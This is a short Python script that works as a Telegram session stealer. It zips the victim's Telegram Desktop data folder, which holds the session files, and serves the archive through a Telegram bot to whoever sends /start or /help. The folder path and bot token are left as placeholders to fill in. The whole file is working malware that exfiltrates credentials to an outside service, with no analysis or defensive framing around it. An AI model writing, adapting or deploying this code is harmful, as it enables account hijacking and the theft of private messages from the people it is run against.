import os

os.system(f"pip install telebot")
os.system(f"pip install zipfile")

import telebot
from zipfile import ZipFile, ZIP_DEFLATED
import zipfile

user = os.path.expanduser("#Telegram Desktop Folder")
home = os.path.expanduser('./')
API_TOKEN = '#Your_telegram_bot_api_token'
bot = telebot.TeleBot(API_TOKEN)

def zip_arc():
    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
        for root, dirs, files in os.walk(user):
           for file in files:
                file_path = os.path.join(root, file)
                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
zip_arc()

@bot.message_handler(commands=['help', 'start'])
def on_last_command(message: telebot.types.Message) -> None:
    with open("./tdata.zip", "rb") as file:
        bot.send_document(message.chat.id, file)

bot.infinity_polling()


